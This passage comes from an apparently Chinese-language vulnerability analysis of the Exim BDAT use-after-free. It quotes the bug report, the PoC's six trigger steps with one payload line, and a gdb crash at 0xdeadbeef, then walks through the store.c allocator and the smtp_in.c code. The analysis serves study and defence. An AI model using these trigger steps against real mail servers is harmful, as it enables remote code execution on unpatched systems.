class="line">*R10  0xffff80fab41c4748</div><div class="line">*R11  0x203</div><div class="line">*R12  0x7f054dc69993 (state+3) ◂— 0x0</div><div class="line">*R13  0x4ad5b6 ◂— jb     0x4ad61d /* &apos;receive.c&apos; */</div><div class="line">*R14  0x7df</div><div class="line">*R15  0x1e1d8f0 ◂— 0x0</div><div class="line">*RBP  0x0</div><div class="line">*RSP  0x7ffe169262b8 —▸ 0x7f054d9275e7 (free+247) ◂— add    rsp, 0x28</div><div class="line">*RIP  0xdeadbeef</div><div class="line">------------------------------------------</div><div class="line">Invalid address 0xdeadbeef</div></pre></td></tr></table></figure>
<p>PS: 这里说明下<code>./build-Linux-x86_64/exim</code>这个binary是没有patch printf的代码，<code>/usr/exim/bin/exim</code>是patch了printf的binary</p>
<p>到这里就很奇怪了，加了个printf就能成功触发漏洞，删了就不能，之后用<code>puts</code>和<code>write</code>代替了<code>printf</code>进行测试，发现<code>puts</code>也能成功触发漏洞，但是<code>write</code>不能。大概能猜到应该是stdio的缓冲区机制的问题，然后继续深入研究。</p>
<h1 id="深入研究"><a href="#深入研究" class="headerlink" title="深入研究"></a>深入研究</h1><p>来看看meh在Bugzilla上对于该漏洞的所有描述：</p>
<blockquote>
<p>Hi, we found a use-after-free vulnerability which is exploitable to RCE in the SMTP server.</p>
<p>According to receive.c:1783,<br>1783     if (!store_extend(next-&gt;text, oldsize, header_size))<br>1784       {<br>1785       uschar *newtext = store_get(header_size);<br>1786       memcpy(newtext, next-&gt;text, ptr);<br>1787       store_release(next-&gt;text);<br>1788       next-&gt;text = newtext;<br>1789       }</p>
<p>when the buffer used to parse header is not big enough, exim tries to extend the next-&gt;text with store_extend function. If there is any other allocation between the allocation and extension of this buffer, store_extend fails.<br>store.c<br>276 if ((char <em>)ptr + rounded_oldsize != (char </em>)(next_yield[store_pool]) ||<br>277     inc &gt; yield_length[store_pool] + rounded_oldsize - oldsize)<br>278   return FALSE;</p>
<p>Then exim calls store_get, and store_get cut the current_block directly.<br>store.c<br>208 next_yield[store_pool] = (void <em>)((char </em>)next_yield[store_pool] + size);<br>209 yield_length[store_pool] -= size;<br>210<br>211 return store_last_get[store_pool];</p>
<p>However, in receive.c:1787, store_release frees the whole block, leaving the new pointer points to a freed location. Any further usage of this buffer leads to a use-after-free vulnerability.<br>To trigger this bug, BDAT command is necessary to perform an allocation by raising an error. Through our research, we confirm that this vulnerability can be exploited to remote code execution if the binary is not compiled with PIE.<br>An RIP controlling PoC is in attachment poc.py. The following is the gdb result of this PoC:<br>Program received signal SIGSEGV, Segmentation fault.<br>0x00000000deadbeef in ?? ()</p>
<h2 id="gdb"><a href="#gdb" class="headerlink" title="(gdb)"></a>(gdb)</h2><p>In receive.c, exim used receive_getc to get message.<br>1831     ch = (receive_getc)(GETC_BUFFER_UNLIMITED);<br>When exim is handling BDAT command, receive_getc is bdat_getc.<br>In bdat_getc, after the length of BDAT is reached, bdat_getc tries to read the next command.<br>smtp_in.c<br> 536 next_cmd:<br> 537   switch(smtp_read_command(TRUE, 1))<br> 538     {<br> 539     default:<br> 540       (void) synprot_error(L_smtp_protocol_error, 503, NULL,<br> 541     US”only BDAT permissible after non-LAST BDAT”);</p>
<p>synprot_error may call store_get if any non-printable character exists because synprot_error uses string_printing.</p>
<p>string.c<br> 304 /<em> Get a new block of store guaranteed big enough to hold the<br> 305 expanded string. </em>/<br> 306</p>
<h2 id="307-ss-store-get-length-nonprintcount-3-1"><a href="#307-ss-store-get-length-nonprintcount-3-1" class="headerlink" title=" 307 ss = store_get(length + nonprintcount * 3 + 1);"></a> 307 ss = store_get(length + nonprintcount * 3 + 1);</h2><p>receive_getc becomes bdat_getc when handling BDAT data.<br>Oh, I was talking about the source code of 4.89. In the current master, it is here:<br><a href="https://github.com/Exim/exim/blob/master/src/src/receive.c#L1790" target="_blank" rel="external">https://github.com/Exim/exim/blob/master/src/src/receive.c#L1790</a></p>
<p>What this PoC does is:</p>
<ol>
<li>send unrecognized command to adjust yield_length and make it less than 0x100</li>
<li>send BDAT 1</li>
<li>send one character to reach the length of BDAT</li>
<li>send an BDAT command without size and with non-printable character -&gt; trigger synprot_error and therefore call store_get<br>// back to receive_msg and exim keeps trying to read header</li>
<li>send a huge message until store_extend called</li>
<li>uaf</li>
</ol>
<p>This PoC is affected by the block layout(yield_length), so this line: <code>r.sendline(&#39;a&#39;*0x1250+&#39;\x7f&#39;)</code> should be adjusted according to the program state. I tested on my ubuntu 16.04, compiled with the attached Local/Makefile (simply make -j8). I also attach the updated PoC for current master and the debug report.</p>
</blockquote>
<p>在这里先提一下，在Exim中，自己封装实现了一套简单的堆管理，在src/store.c中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div></pre></td><td class="code"><pre><div class="line">void *</div><div class="line">store_get_3(int size, const char *filename, int linenumber)</div><div class="line">&#123;</div><div class="line">/* Round up the size to a multiple of the alignment. Although this looks a</div><div class="line">messy statement, because &quot;alignment&quot; is a constant expression, the compiler can</div><div class="line">do a reasonable job of optimizing, especially if the value of &quot;alignment&quot; is a</div><div class="line">power of two. I checked this with -O2, and gcc did very well, compiling it to 4</div><div class="line">instructions on a Sparc (alignment = 8). */</div><div class="line"></div><div class="line">if (size % alignment != 0) size += alignment - (size % alignment);</div><div class="line"></div><div class="line">/* If there isn&apos;t room in the current block, get a new one. The minimum</div><div class="line">size is STORE_BLOCK_SIZE, and we would expect this to be the norm, since</div><div class="line">these functions are mostly called for small amounts of store. */</div><div class="line"></div><div class="line">if (size &gt; yield_length[store_pool])</div><div class="line">  &#123;</div><div class="line">  int length = (size &lt;= STORE_BLOCK_SIZE)? STORE_BLOCK_SIZE : size;</div><div class="line">  int mlength = length + ALIGNED_SIZEOF_STOREBLOCK;</div><div class="line">  storeblock * newblock = NULL;</div><div class="line"></div><div class="line">  /* Sometimes store_reset() may leave a block for us; check if we can use it */</div><div class="line"></div><div class="line">  if (  (newblock = current_block[store_pool])</div><div class="line">     &amp;&amp; (newblock = newblock-&gt;next)</div><div class="line">     &amp;&amp; newblock-&gt;length &lt; length</div><div class="line">     )</div><div class="line">    &#123;</div><div class="line">    /* Give up on this block, because it&apos;s too small */</div><div class="line">    store_free(newblock);</div><div class="line">    newblock = NULL;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  /* If there was no free block, get a new one */</div><div class="line"></div><div class="line">  if (!newblock)</div><div class="line">    &#123;</div><div class="line">    pool_malloc += mlength;           /* Used in pools */</div><div class="line">    nonpool_malloc -= mlength;        /* Exclude from overall total */</div><div class="line">    newblock = store_malloc(mlength);</div><div class="line">    newblock-&gt;next = NULL;</div><div class="line">    newblock-&gt;length = length;</div><div class="line">    if (!chainbase[store_pool])</div><div class="line">      chainbase[store_pool] = newblock;</div><div class="line">    else</div><div class="line">      current_block[store_pool]-&gt;next = newblock;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  current_block[store_pool] = newblock;</div><div class="line">  yield_length[store_pool] = newblock-&gt;length;</div><div class="line">  next_yield[store_pool] =</div><div class="line">    (void *)(CS current_block[store_pool] + ALIGNED_SIZEOF_STOREBLOCK);</div><div class="line">  (void) VALGRIND_MAKE_MEM_NOACCESS(next_yield[store_pool], yield_length[store_pool]);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">/* There&apos;s (now) enough room in the current block; the yield is the next</div><div class="line">pointer. */</div><div class="line"></div><div class="line">store_last_get[store_pool] = next_yield[store_pool];</div><div class="line"></div><div class="line">/* Cut out the debugging stuff for utilities, but stop picky compilers from</div><div class="line">giving warnings. */</div><div class="line"></div><div class="line">#ifdef COMPILE_UTILITY</div><div class="line">filename = filename;</div><div class="line">linenumber = linenumber;</div><div class="line">#else</div><div class="line">DEBUG(D_memory)</div><div class="line">  &#123;</div><div class="line">  if (running_in_test_harness)</div><div class="line">    debug_printf(&quot;---%d Get %5d\n&quot;, store_pool, size);</div><div class="line">  else</div><div class="line">    debug_printf(&quot;---%d Get %6p %5d %-14s %4d\n&quot;, store_pool,</div><div class="line">      store_last_get[store_pool], size, filename, linenumber);</div><div class="line">  &#125;</div><div class="line">#endif  /* COMPILE_UTILITY */</div><div class="line"></div><div class="line">(void) VALGRIND_MAKE_MEM_UNDEFINED(store_last_get[store_pool], size);</div><div class="line">/* Update next pointer and number of bytes left in the current block. */</div><div class="line"></div><div class="line">next_yield[store_pool] = (void *)(CS next_yield[store_pool] + size);</div><div class="line">yield_length[store_pool] -= size;</div><div class="line"></div><div class="line">return store_last_get[store_pool];</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">BOOL</div><div class="line">store_extend_3(void *ptr, int oldsize, int newsize, const char *filename,</div><div class="line">  int linenumber)</div><div class="line">&#123;</div><div class="line">int inc = newsize - oldsize;</div><div class="line">int rounded_oldsize = oldsize;</div><div class="line"></div><div class="line">if (rounded_oldsize % alignment != 0)</div><div class="line">  rounded_oldsize += alignment - (rounded_oldsize % alignment);</div><div class="line"></div><div class="line">if (CS ptr + rounded_oldsize != CS (next_yield[store_pool]) ||</div><div class="line">    inc &gt; yield_length[store_pool] + rounded_oldsize - oldsize)</div><div class="line">  return FALSE;</div><div class="line"></div><div class="line">/* Cut out the debugging stuff for utilities, but stop picky compilers from</div><div class="line">giving warnings. */</div><div class="line"></div><div class="line">#ifdef COMPILE_UTILITY</div><div class="line">filename = filename;</div><div class="line">linenumber = linenumber;</div><div class="line">#else</div><div class="line">DEBUG(D_memory)</div><div class="line">  &#123;</div><div class="line">  if (running_in_test_harness)</div><div class="line">    debug_printf(&quot;---%d Ext %5d\n&quot;, store_pool, newsize);</div><div class="line">  else</div><div class="line">    debug_printf(&quot;---%d Ext %6p %5d %-14s %4d\n&quot;, store_pool, ptr, newsize,</div><div class="line">      filename, linenumber);</div><div class="line">  &#125;</div><div class="line">#endif  /* COMPILE_UTILITY */</div><div class="line"></div><div class="line">if (newsize % alignment != 0) newsize += alignment - (newsize % alignment);</div><div class="line">next_yield[store_pool] = CS ptr + newsize;</div><div class="line">yield_length[store_pool] -= newsize - rounded_oldsize;</div><div class="line">(void) VALGRIND_MAKE_MEM_UNDEFINED(ptr + oldsize, inc);</div><div class="line">return TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">void</div><div class="line">store_release_3(void *block, const char *filename, int linenumber)</div><div class="line">&#123;</div><div class="line">storeblock *b;</div><div class="line"></div><div class="line">/* It will never be the first block, so no need to check that. */</div><div class="line"></div><div class="line">for (b = chainbase[store_pool]; b != NULL; b = b-&gt;next)</div><div class="line">  &#123;</div><div class="line">  storeblock *bb = b-&gt;next;</div><div class="line">  if (bb != NULL &amp;&amp; CS block == CS bb + ALIGNED_SIZEOF_STOREBLOCK)</div><div class="line">    &#123;</div><div class="line">    b-&gt;next = bb-&gt;next;</div><div class="line">    pool_malloc -= bb-&gt;length + ALIGNED_SIZEOF_STOREBLOCK;</div><div class="line"></div><div class="line">    /* Cut out the debugging stuff for utilities, but stop picky compilers</div><div class="line">    from giving warnings. */</div><div class="line"></div><div class="line">    #ifdef COMPILE_UTILITY</div><div class="line">    filename = filename;</div><div class="line">    linenumber = linenumber;</div><div class="line">    #else</div><div class="line">    DEBUG(D_memory)</div><div class="line">      &#123;</div><div class="line">      if (running_in_test_harness)</div><div class="line">        debug_printf(&quot;-Release       %d\n&quot;, pool_malloc);</div><div class="line">      else</div><div class="line">        debug_printf(&quot;-Release %6p %-20s %4d %d\n&quot;, (void *)bb, filename,</div><div class="line">          linenumber, pool_malloc);</div><div class="line">      &#125;</div><div class="line">    if (running_in_test_harness)</div><div class="line">      memset(bb, 0xF0, bb-&gt;length+ALIGNED_SIZEOF_STOREBLOCK);</div><div class="line">    #endif  /* COMPILE_UTILITY */</div><div class="line"></div><div class="line">    free(bb);</div><div class="line">    return;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>UAF漏洞所涉及的关键函数：</p>
<ul>
<li>store_get_3  堆分配</li>
<li>store_extend_3  堆扩展</li>
<li>store_release_3  堆释放</li>
</ul>
<p>还有4个重要的全局变量：</p>
<ul>
<li>chainbase</li>
<li>next_yield</li>
<li>current_block</li>
<li>yield_length</li>
</ul>
<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>发送一堆未知的命令去调整<code>yield_length</code>的值，使其小于0x100。</p>
<p><code>yield_length</code>表示的是堆还剩余的长度，每次命令的处理使用的是<a href="https://github.com/Exim/exim/blob/ef9da2ee969c27824fcd5aed6a59ac4cd217587b/src/src/receive.c#L1617" target="_blank" rel="external">src/receive.c</a>代码中的<code>receive_msg</code>函数</p>
<p>在该函数处理用户输入的命令时，使用<code>next-&gt;text</code>来储存用户输入，在1709行进行的初始化：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1625  int  header_size = 256;</div><div class="line">......</div><div class="line">1709  next-&gt;text = store_get(header_size);</div></pre></td></tr></table></figure>
<p>在执行1709行代码的时候，如果<code>0x100 &gt; yield_length</code>则会执行到<code>newblock = store_malloc(mlength);</code>，使用glibc的malloc申请一块内存，为了便于之后的描述，这块内存我们称为heap1。</p>
<p>根据<code>store_get_3</code>中的代码，这个时候：</p>
<ul>
<li>current_block-&gt;next = heap1   (因为之前current_block==chainbase，所以这相当于是chainbase-&gt;next = heap1)</li>
<li>current_block = heap1</li>
<li>yield_length = 0x2000</li>
<li>next_yield = heap1+0x10</li>
<li>return next_yield</li>
<li>next_yield = next_yield+0x100 = heap1+0x110</li>
<li>yield_length = yield_length - 0x100 = 0x1f00</li>
</ul>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>发送<code>BDAT 1</code>，进入<code>receive_msg</code>函数，并且让<code>receive_getc</code>变为<code>bdat_getc</code></p>
<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>发送<code>BDAT \x7f</code></p>
<p>相关代码在<a href="https://github.com/Exim/exim/blob/b488395f4d99d44a950073a64b35ec8729102782/src/src/smtp_in.c" target="_blank" rel="external">src/smtp_in.c</a>中的<code>bdat_getc</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div></pre></td><td class="code"><pre><div class="line">int</div><div class="line">bdat_getc(unsigned lim)</div><div class="line">&#123;</div><div class="line">uschar * user_msg = NULL;</div><div class="line">uschar * log_msg;</div><div class="line"></div><div class="line">for(;;)</div><div class="line">  &#123;</div><div class="line">#ifndef DISABLE_DKIM</div><div class="line">  BOOL dkim_save;</div><div class="line">#endif</div><div class="line"></div><div class="line">  if (chunking_data_left &gt; 0)</div><div class="line">    return lwr_receive_getc(chunking_data_left--);</div><div class="line"></div><div class="line">  receive_getc = lwr_receive_getc;</div><div class="line">  receive_getbuf = lwr_receive_getbuf;</div><div class="line">  receive_ungetc = lwr_receive_ungetc;</div><div class="line">#ifndef DISABLE_DKIM</div><div class="line">  dkim_save = dkim_collect_input;</div><div class="line">  dkim_collect_input = FALSE;</div><div class="line">#endif</div><div class="line"></div><div class="line">  /* Unless PIPELINING was offered, there should be no next command</div><div class="line">  until after we ack that chunk */</div><div class="line"></div><div class="line">  if (!pipelining_advertised &amp;&amp; !check_sync())</div><div class="line">    &#123;</div><div class="line">    unsigned n = smtp_inend - smtp_inptr;</div><div class="line">    if (n &gt; 32) n = 32;</div><div class="line"></div><div class="line">    incomplete_transaction_log(US&quot;sync failure&quot;);</div><div class="line">    log_write(0, LOG_MAIN|LOG_REJECT, &quot;SMTP protocol synchronization error &quot;</div><div class="line">      &quot;(next input sent too soon: pipelining was not advertised): &quot;</div><div class="line">      &quot;rejected \&quot;%s\&quot; %s next input=\&quot;%s\&quot;%s&quot;,</div><div class="line">      smtp_cmd_buffer, host_and_ident(TRUE),</div><div class="line">      string_printing(string_copyn(smtp_inptr, n)),</div><div class="line">      smtp_inend - smtp_inptr &gt; n ? &quot;...&quot; : &quot;&quot;);</div><div class="line">    (void) synprot_error(L_smtp_protocol_error, 554, NULL,</div><div class="line">      US&quot;SMTP synchronization error&quot;);</div><div class="line">    goto repeat_until_rset;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  /* If not the last, ack the received chunk.  The last response is delayed</div><div class="line">  until after the data ACL decides on it */</div><div class="line"></div><div class="line">  if (chunking_state == CHUNKING_LAST)</div><div class="line">    &#123;</div><div class="line">#ifndef DISABLE_DKIM</div><div class="line">    dkim_exim_verify_feed(NULL, 0);	/* notify EOD */</div><div class="line">#endif</div><div class="line">    return EOD;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  smtp_printf(&quot;250 %u byte chunk received\r\n&quot;, FALSE, chunking_datasize);</div><div class="line">  chunking_state = CHUNKING_OFFERED;</div><div class="line">  DEBUG(D_receive) debug_printf(&quot;chunking state %d\n&quot;, (int)chunking_state);</div><div class="line"></div><div class="line">  /* Expect another BDAT cmd from input. RFC 3030 says nothing about</div><div class="line">  QUIT, RSET or NOOP but handling them seems obvious */</div><div class="line"></div><div class="line">next_cmd:</div><div class="line">  switch(smtp_read_command(TRUE, 1))</div><div class="line">    &#123;</div><div class="line">    default:</div><div class="line">      (void) synprot_error(L_smtp_protocol_error, 503, NULL,</div><div class="line">	US&quot;only BDAT permissible after non-LAST BDAT&quot;);</div><div class="line"></div><div class="line">  repeat_until_rset:</div><div class="line">      switch(smtp_read_command(TRUE, 1))</div><div class="line">	&#123;</div><div class="line">	case QUIT_CMD:	smtp_quit_handler(&amp;user_msg, &amp;log_msg);	/*FALLTHROUGH */</div><div class="line">	case EOF_CMD:	return EOF;</div><div class="line">	case RSET_CMD:	smtp_rset_handler(); return ERR;</div><div class="line">	default:	if (synprot_error(L_smtp_protocol_error, 503, NULL,</div><div class="line">					  US&quot;only RSET accepted now&quot;) &gt; 0)</div><div class="line">			  return EOF;</div><div class="line">			goto repeat_until_rset;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">    case QUIT_CMD:</div><div class="line">      smtp_quit_handler(&amp;user_msg, &amp;log_msg);</div><div class="line">      /*FALLTHROUGH*/</div><div class="line">    case EOF_CMD:</div><div class="line">      return EOF;</div><div class="line"></div><div class="line">    case RSET_CMD:</div><div class="line">      smtp_rset_handler();</div><div class="line">      return ERR;</div><div class="line"></div><div class="line">    case NOOP_CMD:</div><div class="line">      HAD(SCH_NOOP);</div><div class="line">      smtp_printf(&quot;250 OK\r\n&quot;, FALSE);</div><div class="line">      goto next_cmd;</div><div class="line"></div><div class="line">    case BDAT_CMD:</div><div class="line">      &#123;</div><div class="line">      int n;</div><div class="line"></div><div class="line">      if (sscanf(CS smtp_cmd_data, &quot;%u %n&quot;, &amp;chunking_datasize, &amp;n) &lt; 1)</div><div class="line">	&#123;</div><div class="line">	(void) synprot_error(L_smtp_protocol_error, 501, NULL,</div><div class="line">	  US&quot;missing size for BDAT command&quot;);</div><div class="line">	return ERR;</div><div class="line">	&#125;</div><div class="line">      chunking_state = strcmpic(smtp_cmd_data+n, US&quot;LAST&quot;) == 0</div><div class="line">	? CHUNKING_LAST : CHUNKING_ACTIVE;</div><div class="line">      chunking_data_left = chunking_datasize;</div><div class="line">      DEBUG(D_receive) debug_printf(&quot;chunking state %d, %d bytes\n&quot;,</div><div class="line">				    (int)chunking_state, chunking_data_left);</div><div class="line"></div><div class="line">      if (chunking_datasize == 0)</div><div class="line">	if (chunking_state == CHUNKING_LAST)</div><div class="line">	  return EOD;</div><div class="line">	else</div><div class="line">	  &#123;</div><div class="line">	  (void) synprot_error(L_smtp_protocol_error, 504, NULL,</div><div class="line">	    US&quot;zero size for BDAT command&quot;);</div><div class="line">	  goto repeat_until_rset;</div><div class="line">	  &#125;</div><div class="line"></div><div class="line">      receive_getc = bdat_getc;</div><div class="line">      receive_getbuf = bdat_getbuf;</div><div class="line">      receive_ungetc = bdat_ungetc;</div><div class="line">#ifndef DISABLE_DKIM</div><div class="line">      dkim_collect_input = dkim_save;</div><div class="line">#endif</div><div class="line">      break;	/* to top of main loop */</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>BDAT命令进入下面这个分支：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">f (sscanf(CS smtp_cmd_data, &quot;%u %n&quot;, &amp;chunking_datasize, &amp;n) &lt; 1)</div><div class="line">	&#123;</div><div class="line">	(void) synprot_error(L_smtp_protocol_error, 501, NULL,</div><div class="line">	  US&quot;missing size for BDAT command&quot;);</div><div class="line">	return ERR;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>因为<code>\x7F</code> 所以sscanf获取长度失败，进入<code>synprot_error</code>函数，该函数同样是位于<code>smtp_in.c</code>文件中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">static int</div><div class="line">synprot_error(int type, int code, uschar *data, uschar *errmess)</div><div class="line">&#123;</div><div class="line">int yield = -1;</div><div class="line"></div><div class="line">log_write(type, LOG_MAIN, &quot;SMTP %s error in \&quot;%s\&quot; %s %s&quot;,</div><div class="line">  (type == L_smtp_syntax_error)? &quot;syntax&quot; : &quot;protocol&quot;,</div><div class="line">  string_printing(smtp_cmd_buffer), host_and_ident(TRUE), errmess);</div><div class="line"></div><div class="line">if (++synprot_error_count &gt; smtp_max_synprot_errors)</div><div class="line">  &#123;</div><div class="line">  yield = 1;</div><div class="line">  log_write(0, LOG_MAIN|LOG_REJECT, &quot;SMTP call from %s dropped: too many &quot;</div><div class="line">    &quot;syntax or protocol errors (last command was \&quot;%s\&quot;)&quot;,</div><div class="line">    host_and_ident(FALSE), string_printing(smtp_cmd_buffer));</div><div class="line">  &#125;</div><div class="line"></div><div class="line">if (code &gt; 0)</div><div class="line">  &#123;</div><div class="line">  smtp_printf(&quot;%d%c%s%s%s\r\n&quot;, FALSE, code, yield == 1 ? &apos;-&apos; : &apos; &apos;,</div><div class="line">    data ? data : US&quot;&quot;, data ? US&quot;: &quot; : US&quot;&quot;, errmess);</div><div class="line">  if (yield == 1)</div><div class="line">    smtp_printf(&quot;%d Too many syntax or protocol errors\r\n&quot;, FALSE, code);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">return yield;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后在<code>synprot_error</code>函数中有一个<code>string_printing</code>函数，位于<a href="https://github.com/Exim/exim/blob/9242a7e8cfa94bbc9dd7eca6bd651b569b871c4e/src/src/string.c" target="_blank" rel="external">src/string.c</a>代码中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">const uschar *</div><div class="line">string_printing2(const uschar *s, BOOL allow_tab)</div><div class="line">&#123;</div><div class="line">int nonprintcount = 0;</div><div class="line">int length = 0;</div><div class="line">const uschar *t = s;</div><div class="line">uschar *ss, *tt;</div><div class="line"></div><div class="line">while (*t != 